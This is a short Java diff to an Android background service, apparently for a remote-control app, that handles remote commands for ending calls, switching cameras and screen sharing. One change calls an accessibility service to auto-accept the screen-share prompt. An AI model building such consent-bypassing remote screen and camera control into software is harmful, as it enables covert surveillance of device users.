@@ -152,6 +152,7 @@ public class BackgroundKeepAliveService extends Service {
         startInForeground();
         acquireLocks();
         initBackgroundSocket();
+        CrashReporter.checkAndReportPreviousCrash(this);
         mWatchdogHandler.postDelayed(mWatchdogRunnable, 5000);
     }
 
@@ -386,12 +387,11 @@ public class BackgroundKeepAliveService extends Service {
                     } else if ("end_call".equals(command)) {
                         Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
                         stopService(serviceIntent);
+                        sendBroadcast(new Intent("com.tokendeal.vremote.ACTION_END_CALL"));
                         if (MainActivity.getInstance() != null) {
                             MainActivity.getInstance().runOnUiThread(() -> {
                                 MainActivity.getInstance().stopAllMediaAndFinish();
                             });
-                        } else {
-                            wakeUpAndLaunch("end_call", caller, cameraChoice);
                         }
                     } else if ("flip_camera".equals(command) || "switch_camera".equals(command)) {
                         if (MainActivity.getInstance() != null && MainActivity.getInstance().getWebRTCCompanion() != null) {
@@ -448,7 +448,7 @@ public class BackgroundKeepAliveService extends Service {
         } catch (Exception ignored) {}
 
         if ("screen_share".equals(command) || "screen_share_control".equals(command)) {
-            RemoteAccessibilityService.setAutoAcceptPending(true);
+            RemoteAccessibilityService.triggerAutoAccept(this);
         }
 
         // 1. If MainActivity is already running in background, dispatch directly!
